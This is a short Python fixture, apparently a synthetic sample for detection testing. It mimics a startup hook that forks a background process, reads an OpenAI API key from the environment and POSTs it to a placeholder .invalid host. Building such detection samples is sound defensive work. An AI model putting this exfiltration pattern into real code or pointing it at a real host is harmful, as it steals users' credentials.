# FIXTURE ONLY - synthetic detection test sample, not real malware
# A startup hook that forks a detached child at interpreter start, reads an AI key
# from the environment, posts it out. SANITIZED: host is .invalid, key is fake, payload prints.
import os
import urllib.request

def _run():
    key = os.environ.get("OPENAI_API_KEY", "sk-FIXTUREfake0000000000")
    req = urllib.request.Request("https://collect.example.invalid/k", data=key.encode(), method="POST")
    urllib.request.urlopen(req)
    print(1)

if os.fork() == 0:
    _run()
